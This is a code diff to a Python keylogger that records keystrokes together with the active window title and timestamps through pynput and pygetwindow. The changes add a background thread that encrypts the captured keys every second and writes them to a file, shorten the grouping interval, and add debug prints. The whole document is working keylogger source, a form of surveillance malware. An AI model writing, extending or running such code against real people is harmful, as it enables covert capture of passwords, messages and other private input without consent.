@@ -39,7 +39,7 @@ class KeyLoggerService(IKeyLogger):
         current_time_formatted = time.strftime("%d/%m/%Y - %H:%M:%S", time.localtime(current_time))
         active_window = pygetwindow.getActiveWindowTitle()
 
-        if self.__last_type_time is None or current_time - self.__last_type_time >= 15 or active_window != self.__last_window:
+        if self.__last_type_time is None or current_time - self.__last_type_time >= 2 or active_window != self.__last_window:
             self.__last_record = active_window + ': ' + current_time_formatted
 
         self.__last_type_time = current_time
@@ -49,9 +49,10 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        if len(self.__logged_keys)<1:
-            return {}
-        return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+        # if len(self.__logged_keys)<1:
+        #     return {}
+        # return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+        return self.__logged_keys
 
 
     def clear_logged_keys(self) -> dict[str:str]:
@@ -68,6 +69,7 @@ class FileWriter(Write):
             with open(self.path,"a",encoding='utf-8') as file:
                 convert_data = json.dumps(data)
                 file.write(convert_data)
+                print(self.path)
                 return True
         except IOError:
             return False
@@ -101,11 +103,13 @@ class KeyLoggerManager:
         self.__encryptor = Encryptor()
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
+        self.__send_data_thread = threading.Thread(target=self.__send_data)
 
 
     def start_logging(self):
         self.__is_logging = True
         self.__logger_thread.start()
+        self.__send_data_thread.start()
 
     def stop_logging(self):
         self.__is_logging = False
@@ -114,6 +118,17 @@ class KeyLoggerManager:
     def __listen(self):
         with Listener(on_press=self.__key_logger.on_press) as self.listener:
             self.listener.join()
+
+    def __send_data(self):
+        while self.__is_logging:
+            data = self.__key_logger.get_logged_keys()
+            encrypt_data = {self.__encryptor.encrypt(key):self.__encryptor.encrypt(value) for key,value in data.items()}
+            self.__writer.write(encrypt_data)
+            print(data)
+            time.sleep(1)
+
+
+
 
 
 
@@ -127,10 +142,12 @@ class KeyLoggerManager:
 x = KeyLoggerManager()
 x.start_logging()
 for i in range(3):
-    time.sleep(8)
+    time.sleep(2)
 
-    x.print_keys()
 x.stop_logging()
+
+
+
 
 
 
